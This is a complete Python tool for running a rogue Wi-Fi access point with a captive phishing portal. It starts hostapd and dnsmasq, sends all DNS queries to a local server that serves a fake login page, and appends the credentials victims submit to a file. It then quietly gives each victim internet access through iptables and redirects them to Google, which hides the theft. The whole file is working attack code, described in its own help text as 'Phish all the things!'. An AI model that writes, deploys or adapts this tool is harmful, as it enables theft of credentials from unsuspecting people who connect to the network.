#!/usr/bin/env python3

import os
import argparse
import subprocess
import logging
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

HOSTAPD_CONFIG = """
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
"""

class IFace:
    def __init__(self, name):
        self.name = name

    def ensure_addr(self, addr, netmask):
        p = subprocess.Popen(f"ip addr add {addr}/{netmask} dev {self.name}".split(),
                    shell=False, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))
        p.wait()
        return p.returncode in [0,2]

    @staticmethod
    def enable_forwarding():
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("echo 1 > /proc/sys/net/ipv6/conf/all/forwarding")


class IpTables:
    FLUSH_COMMANDS = ["iptables -F", "iptables -t nat -F",  "iptables -t mangle -F", "iptables -X"]

    @staticmethod
    def exec(cmd):
        return subprocess.Popen(cmd, shell=False, stdout=open("/dev/null", "w"), stderr=open("/dev/null", "w"))

    @staticmethod
    def setup(wifi_iface):
        p = IpTables.exec(f"iptables -A FORWARD -i {wifi_iface} -j DROP".split())
        p.wait()

    @staticmethod
    def flush():
        for cmd in IpTables.FLUSH_COMMANDS:
            p = IpTables.exec(cmd.split())
            p.wait()

    @staticmethod
    def allow(ip, wifi_iface, internet_iface):
        # see https://github.com/oblique/create_ap/blob/master/create_ap#L1718

        cmds = list()
        # forward dns to google
        cmds.append(f"iptables -t nat -A PREROUTING -i {wifi_iface} -p udp --dport 53 -j DNAT --to-destination 8.8.8.8:53")
        cmds.append(f"iptables -t nat -A PREROUTING -i {wifi_iface} -p tcp --dport 53 -j DNAT --to-destination 8.8.8.8:53")
        # nat
        cmds.append(f"iptables -t nat -I POSTROUTING -s {ip} ! -o {wifi_iface} -j MASQUERADE")
        # allow forwarding for this ip
        cmds.append(f"iptables -I FORWARD -i {wifi_iface} -s {ip} -j ACCEPT")
        cmds.append(f"iptables -I FORWARD -i {internet_iface} -d {ip} -j ACCEPT")

        for cmd in cmds:
            p = IpTables.exec(cmd.split())
            p.wait()


class FischHttpHandler(BaseHTTPRequestHandler):
    TEMPLATE = None
    OUTFILE = None
    IFACES = (None, None)

    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write(bytes(FischHttpHandler.TEMPLATE, "utf8"))

    def do_POST(self):
        # harvest credentials
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        if post_data:
            try:
                parsed = parse_qs(post_data.decode('utf-8'))
                with open(FischHttpHandler.OUTFILE, "a") as out:
                    out.write("[{}] {}\n".format(datetime.now(), str(parsed)))

                wifi_iface, inet_iface = FischHttpHandler.IFACES

                if wifi_iface and inet_iface:
                    remote_ip = self.client_address[0]
                    IpTables.allow(remote_ip, wifi_iface, inet_iface)
                    self.send_response(302)
                    self.send_header('Location', 'https://www.google.com')
                    self.end_headers()
                    return
            except Exception as ex:
                logging.error(ex)

        self.send_error(404)

def get_installed_packages():
    try:
        from apt import Cache
    except ImportError as ie:
        logging.error(ie)
        return ['dnsmasq', 'hostapd'] # assume its installed
    return [pkg.name for pkg in Cache() if pkg.is_installed]

def check_requirements():
    requirements = set(['dnsmasq', 'hostapd'])
    installed = set(get_installed_packages())
    return requirements.issubset(installed)

def daemonize(command, stdout=None, stdin=None, stderr=None):
    if isinstance(command, str):
        command = command.split()
    return subprocess.Popen(command, shell=False, stdout=stdout, stdin=stdin, stderr=stderr)

def main():
    parser = argparse.ArgumentParser(description="Phish all the things!")
    parser.add_argument('--html-file', dest='template', help='File with the fake site.', required=True)
    parser.add_argument('--output-file', dest='outfile', help='File the credentials should be written to.', required=True)
    parser.add_argument('--iface', dest='iface', help='The interface which should be used.', required=True)
    parser.add_argument('--inet-iface', dest='inet', help='The interface with internet.', required=False)
    parser.add_argument('--ssid', dest='ssid', help='The ssid of the rouge ap.', required=True)
    args = parser.parse_args()

    if not check_requirements():
        return 1

    iface = IFace(args.iface)
    iface.ensure_addr('192.168.66.1', '255.255.255.0') # gateway
    iface.ensure_addr('192.168.66.2', '255.255.255.0') # webserver binds to this

    # kill other processes
    os.system('killall dnsmasq hostapd')

    dev_null = open("/dev/null", "w")
    dnsmasq_cmd = [
        "dnsmasq",
        "--no-daemon", # don't deamonize
        "--no-hosts", # don't read the hostnames in /etc/hosts.
        "--interface=%s" % args.iface, # listen on this interface
        "--no-poll", # Don't poll /etc/resolv.conf for changes.
        "--no-resolv",
        "--dhcp-range=192.168.66.3,192.168.66.254,255.255.255.0,24h",
        "--dhcp-option=3,192.168.66.1", # gateway
        "--dhcp-option=6,192.168.66.1", # dns-server
        "--address=/#/192.168.66.2"
    ]
    dns_proc = daemonize(dnsmasq_cmd)

    hostap_cfg = HOSTAPD_CONFIG.format(iface=args.iface, ssid=args.ssid)
    hostapd_cmd = [
        "hostapd",
        "/dev/stdin"
    ]
    hostapd_proc = daemonize(hostapd_cmd, stdin=subprocess.PIPE)

    try:
        hostapd_proc.communicate(input=str.encode(hostap_cfg), timeout=1)
    except Exception:
        pass

    FischHttpHandler.TEMPLATE = open(args.template).read()
    FischHttpHandler.OUTFILE = args.outfile

    if args.inet and os.path.exists(f"/sys/class/net/{args.inet}"):
        FischHttpHandler.IFACES = (args.iface, args.inet)
        IpTables.flush()
        IpTables.setup(args.iface)
        IFace.enable_forwarding()

    web = HTTPServer(('192.168.66.2', 80), FischHttpHandler)
    return web.serve_forever()

if __name__ == "__main__":
    SystemExit(main())
